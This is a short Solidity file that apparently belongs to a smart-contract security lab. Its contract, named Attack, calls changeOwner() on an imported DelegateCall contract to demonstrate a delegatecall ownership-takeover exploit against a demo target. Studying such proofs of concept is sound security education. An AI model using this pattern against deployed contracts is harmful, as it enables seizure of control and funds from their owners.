// SPDX-License-Identifier:MIT
pragma solidity ^0.8.9;

import "./DelegateCall.sol";

contract Attack {
    DelegateCall public delegatecall;

    constructor(address payable _delegateCallAddress) public{
        delegatecall = DelegateCall(_delegateCallAddress);
    }

    function attack() public{
        address(delegatecall).call(abi.encodeWithSignature("changeOwner()"));
    }
}
